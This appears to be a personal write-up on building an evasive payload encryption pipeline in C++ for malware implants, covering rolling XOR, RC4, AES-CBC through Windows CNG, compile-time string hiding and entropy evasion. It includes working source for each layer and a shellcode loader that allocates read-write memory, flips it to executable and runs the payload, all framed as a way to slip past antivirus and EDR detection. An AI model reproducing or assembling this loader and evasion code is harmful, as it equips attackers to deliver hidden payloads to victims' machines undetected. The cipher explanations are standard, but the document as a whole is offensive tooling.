Payload Protection Pipeline:
XOR → RC4 → AES → Entropy

Building a layered payload encryption and obfuscation system in C++ from scratch — covering rolling XOR, RC4 stream cipher internals, AES-CBC via Windows CNG, compile-time string encryption, and entropy evasion.

01 — Problem

Why Plaintext Payloads Get Caught

A compiled binary carrying a raw payload is trivially fingerprintable. Static analysis tools — from strings(1) to YARA scanners — scan the .rdata and .text sections for recognizable byte sequences. API names, URLs, and high-entropy shellcode blocks are all immediate indicators.

Beyond signatures, AV engines measure section entropy. AES-encrypted data has an entropy of ~7.99 bits/byte — near theoretical maximum — which is itself a heuristic flag even when the bytes are unrecognizable.

Core problem: The payload must be unrecognizable at rest, only materializing in memory at the exact moment of execution, and only surviving there long enough to run.

03 — Implementation

Layer 1: Rolling XOR

XOR is self-inverse: encrypt == decrypt. The same function handles both directions. Single-byte XOR is broken by frequency analysis — the multi-byte rolling key prevents that by cycling a longer key pattern across the data.

C++ xor.cpp 
void xor_crypt(std::vector<uint8_t>& data,
              const std::vector<uint8_t>& key) {
    for (size_t i = 0; i < data.size(); i++)
        data[i] ^= key[i % key.size()];
    // encrypt and decrypt are identical — XOR is its own inverse
}
Key property: If you have any two of {plaintext, ciphertext, key}, you can recover the third. This is why key reuse is fatal — never encrypt two messages with the same keystream.

Layer 2: RC4 Stream Cipher

RC4 generates a pseudorandom keystream from a short key via two phases. The KSA builds a key-dependent permutation of 0–255. The PRGA walks that permutation to emit keystream bytes, which are XOR'd into the data.

C++ rc4.cpp 
class RC4 {
    uint8_t S[256];
    uint8_t i = 0, j = 0;
public:
    RC4(const std::vector<uint8_t>& key) {
        // KSA — key-dependent permutation of S[256]
        for (int i = 0; i < 256; i++) S[i] = i;
        int j = 0;
        for (int i = 0; i < 256; i++) {
            j = (j + S[i] + key[i % key.size()]) % 256;
            std::swap(S[i], S[j]);
        }
    }
    void process(std::vector<uint8_t>& data) {
        // PRGA — emit keystream, XOR into data
        for (auto& byte : data) {
            i = (i + 1) % 256;
            j = (j + S[i]) % 256;
            std::swap(S[i], S[j]);
            byte ^= S[(S[i] + S[j]) % 256];
        }
    }
};

Layer 3: AES-CBC via Windows CNG

AES-CBC is the production standard. Windows CNG (bcrypt.h) provides AES with no external dependencies — ideal for implants. CBC mode chains each block to the previous ciphertext block, eliminating the pattern leakage of ECB.

C++ aes_cng.cpp 
std::vector<uint8_t> aes_encrypt(
    const std::vector<uint8_t>& plaintext,
    const uint8_t key[16], const uint8_t iv[16])
{
    uint8_t iv_copy[16];
    memcpy(iv_copy, iv, 16); // CNG mutates IV in-place — always copy

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    BCRYPT_KEY_HANDLE hKey = nullptr;
    BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, 16, 0);

    ULONG cbResult = 0;
    // First call: get required output size
    BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), plaintext.size(),
        nullptr, iv_copy, 16, nullptr, 0, &cbResult, BCRYPT_BLOCK_PADDING);

    std::vector<uint8_t> out(cbResult);
    BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), plaintext.size(),
        nullptr, iv_copy, 16, out.data(), cbResult, &cbResult, BCRYPT_BLOCK_PADDING);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}
04 — Obfuscation

Compile-Time String Encryption

String literals in C++ land in .rdata as plaintext. strings malware.exe immediately reveals all API names, URLs, and keys. The fix: encrypt at compile time using constexpr — the plaintext never exists in the binary.

C++ cryptstr.cpp 
template<size_t N>
struct CryptStr {
    char data[N] = {};

    // Runs in the COMPILER — result baked into binary encrypted
    constexpr CryptStr(const char (&s)[N], char key) {
        for (size_t i = 0; i < N; i++)
            data[i] = s[i] ^ key;
    }

    // Runs at RUNTIME — decrypts onto stack, gone after scope
    void decrypt(char* out, char key) const {
        for (size_t i = 0; i < N; i++)
            out[i] = data[i] ^ key;
    }
};

constexpr char KEY = 0x5A;
#define HIDE(s) CryptStr<sizeof(s)>(s, KEY)

// Usage — "kernel32.dll" never appears in .rdata:
constexpr auto enc = HIDE("kernel32.dll");
char lib[13]; enc.decrypt(lib, KEY);
HMODULE h = LoadLibraryA(lib); // lib gone after scope
Why constexpr works: const char (&s)[N] is a reference to a fixed-size array — the compiler deduces N automatically from the string literal, enabling compile-time iteration over every byte.
05 — Execution

Runtime Loader: RW → RX Pattern

Allocating PAGE_EXECUTE_READWRITE directly is a loud EDR trigger — legitimate programs almost never need writable and executable memory simultaneously. The correct pattern: allocate RW, copy in decrypted payload, then flip to RX with VirtualProtect.

C++ loader.cpp 
void execute_payload(std::vector<uint8_t>& shellcode) {
    // Step 1: allocate RW — not executable yet
    LPVOID mem = VirtualAlloc(nullptr, shellcode.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());

    // Step 2: flip to RX — write permission removed
    DWORD oldProtect = 0;
    VirtualProtect(mem, shellcode.size(),
        PAGE_EXECUTE_READ, &oldProtect);

    // Step 3: cast to function pointer and execute
    void (*fn)() = (void(*)())mem;
    fn();
}
06 — Key Lessons

What This Taught Me

XOR IS the foundation

Every cipher covered here — RC4, AES-CTR, compile-time encryption — reduces to XOR at the byte level. Owning XOR properties (self-inverse, key recovery from any two of three values) is non-negotiable before touching anything else.

Never reuse a keystream

The two-time pad attack eliminates the key entirely: C1 ^ C2 = P1 ^ P2. This broke WEP. It breaks any stream cipher with key reuse. RC4 objects must be reinitialized per operation.

CNG over OpenSSL for implants

Windows CNG is built into the OS — zero external dependencies, smaller binary footprint, and no OpenSSL import artifacts for AV to flag. The two-call pattern (size query then encrypt) is the correct usage.

Entropy is a detection surface

AES ciphertext entropy (~7.99 bits/byte) is itself a heuristic flag. Null-byte padding, base64 encoding after encryption, or storing payloads in resource sections rather than .text all reduce measured entropy without compromising the encryption.

Compile-time ≠ security, but it buys time

constexpr string encryption defeats static string scanners and strings(1). It does not defeat a determined reverse engineer with a debugger. It raises the cost of analysis — which is the real goal against automated tooling.
